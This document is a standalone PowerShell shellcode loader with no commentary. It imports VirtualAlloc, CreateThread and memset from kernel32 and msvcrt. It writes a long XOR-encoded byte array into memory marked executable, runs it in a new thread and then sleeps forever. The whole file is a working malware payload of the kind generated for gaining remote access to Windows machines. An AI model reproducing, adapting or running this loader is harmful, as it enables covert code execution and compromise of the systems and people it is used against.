
$KQ5Z = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $KQ5Z -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0xe3,0x8e,0xb7,0x39,0xd9,0xf7,0xd9,0x74,0x24,0xf4,0x5b,0x29,0xc9,0xb1,0x47,0x31,0x43,0x13,0x83,0xeb,0xfc,0x03,0x43,0xec,0x6c,0x42,0xc5,0x1a,0xf2,0xad,0x36,0xda,0x93,0x24,0xd3,0xeb,0x93,0x53,0x97,0x5b,0x24,0x17,0xf5,0x57,0xcf,0x75,0xee,0xec,0xbd,0x51,0x01,0x45,0x0b,0x84,0x2c,0x56,0x20,0xf4,0x2f,0xd4,0x3b,0x29,0x90,0xe5,0xf3,0x3c,0xd1,0x22,0xe9,0xcd,0x83,0xfb,0x65,0x63,0x34,0x88,0x30,0xb8,0xbf,0xc2,0xd5,0xb8,0x5c,0x92,0xd4,0xe9,0xf2,0xa9,0x8e,0x29,0xf4,0x7e,0xbb,0x63,0xee,0x63,0x86,0x3a,0x85,0x57,0x7c,0xbd,0x4f,0xa6,0x7d,0x12,0xae,0x07,0x8c,0x6a,0xf6,0xaf,0x6f,0x19,0x0e,0xcc,0x12,0x1a,0xd5,0xaf,0xc8,0xaf,0xce,0x17,0x9a,0x08,0x2b,0xa6,0x4f,0xce,0xb8,0xa4,0x24,0x84,0xe7,0xa8,0xbb,0x49,0x9c,0xd4,0x30,0x6c,0x73,0x5d,0x02,0x4b,0x57,0x06,0xd0,0xf2,0xce,0xe2,0xb7,0x0b,0x10,0x4d,0x67,0xae,0x5a,0x63,0x7c,0xc3,0x00,0xeb,0xb1,0xee,0xba,0xeb,0xdd,0x79,0xc8,0xd9,0x42,0xd2,0x46,0x51,0x0a,0xfc,0x91,0x96,0x21,0xb8,0x0e,0x69,0xca,0xb9,0x07,0xad,0x9e,0xe9,0x3f,0x04,0x9f,0x61,0xc0,0xa9,0x4a,0x1f,0xc5,0x3d,0x70,0x3b,0x07,0x7a,0x12,0xb9,0x88,0x95,0xbe,0x34,0x6e,0xc5,0x10,0x17,0x3f,0xa5,0xc0,0xd7,0xef,0x4d,0x0b,0xd8,0xd0,0x6d,0x34,0x32,0x79,0x07,0xdb,0xeb,0xd1,0xbf,0x42,0xb6,0xaa,0x5e,0x8a,0x6c,0xd7,0x60,0x00,0x83,0x27,0x2e,0xe1,0xee,0x3b,0xc6,0x01,0xa5,0x66,0x40,0x1d,0x13,0x0c,0x6c,0x8b,0x98,0x87,0x3b,0x23,0xa3,0xfe,0x0b,0xec,0x5c,0xd5,0x00,0x25,0xc9,0x96,0x7e,0x4a,0x1d,0x17,0x7e,0x1c,0x77,0x17,0x16,0xf8,0x23,0x44,0x03,0x07,0xfe,0xf8,0x98,0x92,0x01,0xa9,0x4d,0x34,0x6a,0x57,0xa8,0x72,0x35,0xa8,0x9f,0x82,0x09,0x7f,0xd9,0xf0,0x63,0x43;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$aYl6=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($aYl6.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$aYl6,0,0,0);for (;;){Start-sleep 60};

